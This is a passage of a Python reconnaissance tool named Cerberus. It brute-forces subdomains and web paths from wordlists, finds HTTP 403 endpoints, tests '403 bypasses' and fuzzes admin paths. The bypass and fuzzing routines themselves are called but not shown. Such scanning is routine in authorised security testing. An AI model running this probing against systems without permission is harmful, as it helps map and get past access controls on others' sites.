    print(Fore.GREEN + f"[+] Scanning sub-subdomains from {args.subs_file}...\n")
    # Read subdomains from file
    try:
        with open(args.subs_file, 'r') as f:
            subdomains = [line.strip() for line in f if line.strip()]
        print(Fore.CYAN + f"Loaded {len(subdomains)} subdomains from {args.subs_file}")
        print(Fore.CYAN + f"First 3 subdomains: {subdomains[:3]}")
    except FileNotFoundError:
        print(Fore.RED + f"[✗] Subdomains file not found: {args.subs_file}")
        return
    # Get all wordlist files from directory
    wordlist_dir = Path(args.wordlist_dir)
    if not wordlist_dir.exists():
        print(Fore.RED + f"[✗] Wordlist directory not found: {args.wordlist_dir}")
        return
    wordlist_files = list(wordlist_dir.glob("*.txt"))
    if not wordlist_files:
        print(Fore.RED + f"[✗] No .txt wordlist files found in {args.wordlist_dir}")
        return
    print(Fore.CYAN + f"Found {len(wordlist_files)} wordlist files")
    for wf in wordlist_files:
        print(Fore.CYAN + f"  - {wf.name}")
    print(Fore.CYAN + f"Scanning {len(subdomains)} subdomains")
    all_found = set()
    # Scan each subdomain
    for i, subdomain in enumerate(subdomains, 1):
        print(Fore.YELLOW + f"\n[{i}/{len(subdomains)}] Scanning {subdomain}")
        # Quick test: manually test one known combination
        if i == 1:  # Only for first subdomain
            print(Fore.CYAN + f"Testing known combinations first...")
            test_domain = f"api.{subdomain}"
            test_ip = resolve_domain(test_domain)
            if test_ip:
                print(Fore.GREEN + f"✓ Manual test passed: {test_domain} -> {test_ip}")
            else:
                print(Fore.YELLOW + f"✗ Manual test: {test_domain} not found")
        found = scan_subsubdomains(subdomain, wordlist_files, args.threads)
        all_found.update(found)
        print(Fore.GREEN + f"Found {len(found)} sub-subdomains for {subdomain}")
    # Save results
    with open(outfile, 'w') as f:
        for sub in sorted(all_found):
            f.write(f"{sub}\n")
    print(Fore.GREEN + f"\n[✓] Total sub-subdomains found: {len(all_found)}")
    print(Fore.GREEN + f"[✓] Sub-subdomains saved to {outfile}\n")
def wordscan(args):
    # Prepare directory and output file path
    outdir = Path(args.output_dir) if args.output_dir else Path('outputs')
    outdir.mkdir(parents=True, exist_ok=True)
    outfile = outdir / (args.output or 'web_paths.txt')

    # Check if the subdomains file exists and is readable
    try:
        with open(args.subdomain, 'r') as f:
            subdomains = [line.strip() for line in f if line.strip()]
        print(Fore.CYAN + f"Loaded {len(subdomains)} subdomains from {args.subdomain}")
    except FileNotFoundError:
        print(Fore.RED + f"[✗] Subdomains file not found: {args.subdomain}")
        return

    # Ensure the wordlist directory exists and is accessible
    wordlist_dir = Path(args.wordlist_dir)
    if not wordlist_dir.exists():
        print(Fore.RED + f"[✗] Wordlist directory not found: {args.wordlist_dir}")
        return

    # Get all wordlist files from the directory
    wordlist_files = list(wordlist_dir.glob("*.txt"))
    if not wordlist_files:
        print(Fore.RED + f"[✗] No .txt wordlist files found in {args.wordlist_dir}")
        return

    print(Fore.CYAN + f"Found {len(wordlist_files)} wordlist files")
    for wf in wordlist_files:
        print(Fore.CYAN + f"  - {wf.name}")

    all_found_paths = []

    def scan_paths(subdomain, wordlist_files):
        """Scan for web paths using wordlists on a given subdomain"""
        found_paths = set()
        def check_path(path, base_url):
            test_url = f"https://{base_url}{path}"
            try:
                response = requests.get(test_url, timeout=5, allow_redirects=False)
                if response.status_code not in [403, 404, 401]:
                    return test_url
            except requests.RequestException:
                try:
                    test_url = f"http://{base_url}{path}"
                    response = requests.get(test_url, timeout=5, allow_redirects=False)
                    if response.status_code not in [403, 404, 401]:
                        return test_url
                except requests.RequestException:
                    pass
            return None

        # Read wordlist files and collect paths
        total_paths = set()
        for wordlist_file in wordlist_files:
            try:
                with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                    paths = [line.strip() for line in f if line.strip()]
                    for path in paths:
                        total_paths.add(path)
                print(Fore.CYAN + f"Loaded {len(paths)} paths from {wordlist_file}")
            except Exception as e:
                print(Fore.RED + f"Error reading {wordlist_file}: {e}")

        # Perform the scan
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(check_path, path, subdomain): path for path in total_paths}
            completed = 0
            for future in as_completed(futures):
                completed += 1
                if completed % 50 == 0:
                    print(Fore.YELLOW + f"Progress: {completed}/{len(total_paths)} checked")
                result = future.result()
                if result:
                    found_paths.add(result)

        return found_paths

    # Scan each subdomain
    for subdomain in subdomains:
        print(Fore.YELLOW + f"\n[*] Scanning paths for {subdomain}")
        found_paths = scan_paths(subdomain, wordlist_files)
        all_found_paths.extend(found_paths)
        print(Fore.GREEN + f"Found {len(found_paths)} valid paths for {subdomain}")

    # Save the results to the specified output file
    try:
        with open(outfile, 'w') as f:
            for path in all_found_paths:
                f.write(f"{path}\n")
        print(Fore.GREEN + f"[✓] Found {len(all_found_paths)} paths in total")
        print(Fore.GREEN + f"[✓] Results saved to {outfile}\n")
    except Exception as e:
        print(Fore.RED + f"[✗] Failed to write results to file: {e}")

def identify_403(args):
    outdir = prepare_output(args.output_dir)
    outfile = outdir / (args.output or 'endpoints_403.txt')
    # Handle both single subdomain and file with multiple subdomains
    if is_domain(args.subdomain):
        subdomains = [args.subdomain]
        print(Fore.GREEN + f"[+] Identifying 403 endpoints on {args.subdomain}...\n")
    else:
        # It's a file
        try:
            with open(args.subdomain, 'r') as f:
                subdomains = [line.strip() for line in f if line.strip()]
            print(Fore.GREEN + f"[+] Identifying 403 endpoints on {len(subdomains)} subdomains from {args.subdomain}...\n")
            print(Fore.CYAN + f"First 3 subdomains: {subdomains[:3]}")
        except FileNotFoundError:
            print(Fore.RED + f"[✗] File not found: {args.subdomain}")
            return
    # Get all wordlist files from directory
    wordlist_dir = Path(args.wordlist_dir)
    if not wordlist_dir.exists():
        print(Fore.RED + f"[✗] Wordlist directory not found: {args.wordlist_dir}")
        return
    wordlist_files = list(wordlist_dir.glob("*.txt"))
    if not wordlist_files:
        print(Fore.RED + f"[✗] No .txt wordlist files found in {args.wordlist_dir}")
        return
    print(Fore.CYAN + f"Found {len(wordlist_files)} wordlist files")
    for wf in wordlist_files:
        print(Fore.CYAN + f"  - {wf.name}")
    all_found_403s = []
    # Scan each subdomain
    for i, subdomain in enumerate(subdomains, 1):
        print(Fore.YELLOW + f"\n[{i}/{len(subdomains)}] Scanning {subdomain}")
        found_403s = scan_403_endpoints(subdomain, wordlist_files, 10)
        all_found_403s.extend(found_403s)
        print(Fore.GREEN + f"Found {len(found_403s)} 403 endpoints for {subdomain}")
    # Save results
    with open(outfile, 'w') as f:
        for endpoint in all_found_403s:
            f.write(f"{endpoint}\n")
    print(Fore.GREEN + f"\n[✓] Total 403 endpoints found: {len(all_found_403s)}")
    print(Fore.GREEN + f"[✓] Endpoints saved to {outfile}\n")
def bypass_test(args):
    """Test comprehensive 403 bypass techniques on endpoints"""
    outdir = prepare_output(args.output_dir)
    outfile = outdir / (args.output or 'bypass_results.txt')
    print(Fore.GREEN + f"[+] Testing 403 bypasses on endpoints from {args.endpoints_file}...\n")
    bypasses = bypass_403_endpoints(args.endpoints_file, 5)
    # Save results
    with open(outfile, 'w') as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"# 403 Bypass Test Results - {timestamp}\n")
        f.write(f"# Total bypasses found: {len(bypasses)}\n\n")
        for bypass in bypasses:
            f.write(f"URL: {bypass['url']}\n")
            f.write(f"Method: {bypass['method']}\n")
            f.write(f"Status: {bypass['status_code']}\n")
            if bypass['headers']:
                headers_str = ', '.join([f"{k}: {v}" for k, v in bypass['headers'].items()])
                f.write(f"Headers: {headers_str}\n")
            f.write("-" * 50 + "\n")
    print(Fore.GREEN + f"\n[✓] Total bypasses found: {len(bypasses)}")
    print(Fore.GREEN + f"[✓] Results saved to {outfile}\n")
def admin_fuzz(args):
    outdir = prepare_output(args.output_dir)
    outfile = outdir / (args.output or 'admin_fuzz_results.txt')
    # Handle both single subdomain and file with multiple subdomains
    if is_domain(args.subdomain):
        subdomains = [args.subdomain]
        print(Fore.GREEN + f"[+] Fuzzing admin paths on {args.subdomain}...\n")
    else:
        # It's a file
        try:
            with open(args.subdomain, 'r') as f:
                subdomains = [line.strip() for line in f if line.strip()]
            print(Fore.GREEN + f"[+] Fuzzing admin paths on {len(subdomains)} subdomains from {args.subdomain}...\n")
            print(Fore.CYAN + f"First 3 subdomains: {subdomains[:3]}")
        except FileNotFoundError:
            print(Fore.RED + f"[✗] File not found: {args.subdomain}")
            return
    # Get all wordlist files from directory
    wordlist_dir = Path(args.wordlist_dir)
    if not wordlist_dir.exists():
        print(Fore.RED + f"[✗] Wordlist directory not found: {args.wordlist_dir}")
        return
    wordlist_files = list(wordlist_dir.glob("*.txt"))
    if not wordlist_files:
        print(Fore.RED + f"[✗] No .txt wordlist files found in {args.wordlist_dir}")
        return
    print(Fore.CYAN + f"Found {len(wordlist_files)} wordlist files")
    for wf in wordlist_files:
        print(Fore.CYAN + f"  - {wf.name}")
    all_found_endpoints = []
    # Fuzz each subdomain
    for i, subdomain in enumerate(subdomains, 1):
        print(Fore.YELLOW + f"\n[{i}/{len(subdomains)}] Fuzzing {subdomain}")
        found_endpoints = fuzz_admin_paths(subdomain, wordlist_files, 10)
        all_found_endpoints.extend(found_endpoints)
        print(Fore.GREEN + f"Found {len(found_endpoints)} admin endpoints for {subdomain}")
    # Save results
    with open(outfile, 'w') as f:
        for endpoint in all_found_endpoints:
            f.write(f"{endpoint}\n")
    print(Fore.GREEN + f"\n[✓] Total admin endpoints found: {len(all_found_endpoints)}")
    print(Fore.GREEN + f"[✓] Results saved to {outfile}\n")
# Main CLI
def main():
    parser = argparse.ArgumentParser(
        description="Cerberus: Gateway Guardian Recon Pipeline Tool"
    )
    parser.add_argument('--output-dir', '-O', default='outputs', help='Directory for all output files')
    parser.add_argument('--version', action='version', version='Cerberus 1.0.1')
    subparsers = parser.add_subparsers(dest='command', help='Available commands')

    # enum
    p_enum = subparsers.add_parser('enum', help='Enumerate subdomains')
    p_enum.add_argument('domain', help='Base domain (e.g., example.com)')
    p_enum.add_argument('-o', '--output', help='Filename for subdomains')
    p_enum.set_defaults(func=enum_subdomains)

    # filter
    p_filter = subparsers.add_parser('filter', help='Filter wildcard DNS from subs')
    p_filter.add_argument('domain', help='Base domain')
    p_filter.add_argument('wordlist', help='Wordlist (txt)')
    p_filter.add_argument('subs_file', help='Raw subdomains file')
    p_filter.add_argument('-o', '--output', help='Filename for filtered subs')
    p_filter.set_defaults(func=filter_wildcard)

    # subscan
    p_subscan = subparsers.add_parser('subscan', help='Find sub-subdomains')
    p_subscan.add_argument('subs_file', help='Base subdomains file')
    p_subscan.add_argument('wordlist_dir', help='Dir of .txt wordlists')
    p_subscan.add_argument('-t', '--threads', type=int, default=DEFAULT_THREADS, help='Max DNS threads')
    p_subscan.add_argument('-o', '--output', help='Filename for sub-subdomains')
    p_subscan.set_defaults(func=subscan)

    # wordscan
    p_wordscan = subparsers.add_parser('wordscan', help='Wordlist scan on subdomain')
    p_wordscan.add_argument('subdomain', help='Single subdomain or file with subdomains')
    p_wordscan.add_argument('wordlist_dir', help='Dir of .txt wordlists')
    p_wordscan.add_argument('-o', '--output', help='Filename for paths list')  # Added the -o option here
    p_wordscan.set_defaults(func=wordscan)

    # identify403
    p_identify403 = subparsers.add_parser('identify403', help='Discover 403 endpoints')
    p_identify403.add_argument('subdomain', help='Single subdomain or file with subdomains')
    p_identify403.add_argument('wordlist_dir', help='Dir of endpoint wordlists')
    p_identify403.add_argument('-o', '--output', help='Filename for endpoints list')
    p_identify403.set_defaults(func=identify_403)

    # bypass
    p_bypass = subparsers.add_parser('bypass', help='Test CORS/bypass on 403s')
    p_bypass.add_argument('endpoints_file', help='File listing 403 endpoints')
    p_bypass.add_argument('-o', '--output', help='Filename for bypass results')
    p_bypass.set_defaults(func=bypass_test)

    # adminfuzz
    p_adminfuzz = subparsers.add_parser('adminfuzz', help='Fuzz admin paths')
    p_adminfuzz.add_argument('subdomain', help='Single subdomain or file with subdomains')
    p_adminfuzz.add_argument('wordlist_dir', help='Dir of .txt wordlists')
    p_adminfuzz.add_argument('-o', '--output', help='Filename for admin fuzz results')
    p_adminfuzz.set_defaults(func=admin_fuzz)

    args = parser.parse_args()
    if not args.command:
        parser.print_help()
        sys.exit(1)
    args.func(args)

if __name__ == '__main__':
    main()

